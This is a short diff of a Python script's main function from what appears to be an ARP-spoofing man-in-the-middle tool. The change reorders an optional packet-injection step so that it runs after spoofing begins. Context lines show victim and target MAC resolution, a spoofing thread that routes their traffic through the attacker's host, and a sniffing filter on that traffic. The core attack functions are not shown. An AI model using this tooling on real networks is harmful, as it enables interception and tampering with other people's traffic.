@@ -312,15 +312,14 @@ def main():
     log_file = open(args.log, "a") if args.log else None
     stop_event = threading.Event()
 
-    crafted_pkt=""
-    if args.injection:
-        crafted_pkt = interactive_packet_craft()
+
 
     try:
         conf.iface = args.interface
     except Exception as e:
         log_line("[-] Error: "+str(e),log_file)
         exit(1)
+
 
     own_mac = get_if_hwaddr(args.interface) 
     victim_mac = get_mac(args.victim, args.interface)
@@ -329,6 +328,7 @@ def main():
     if not victim_mac or not target_mac:
         print("Could not resolve MAC address for victim or target — aborting.", file=sys.stderr)
         sys.exit(1)
+
 
     log_line(f"Resolved victim {args.victim} -> {victim_mac}", log_file)
     log_line(f"Resolved target {args.target} -> {target_mac}", log_file)
@@ -340,6 +340,10 @@ def main():
     )
     spoof_thread.start()
     log_line("ARP spoofing started — traffic between victim and target now routes through this host.", log_file)
+
+    crafted_pkt=""
+    if args.injection:
+        crafted_pkt = interactive_packet_craft()
 
     bpf_filter = f"tcp port {args.port} and (host {args.victim} or host {args.target}) and not ether src {own_mac}" 
 
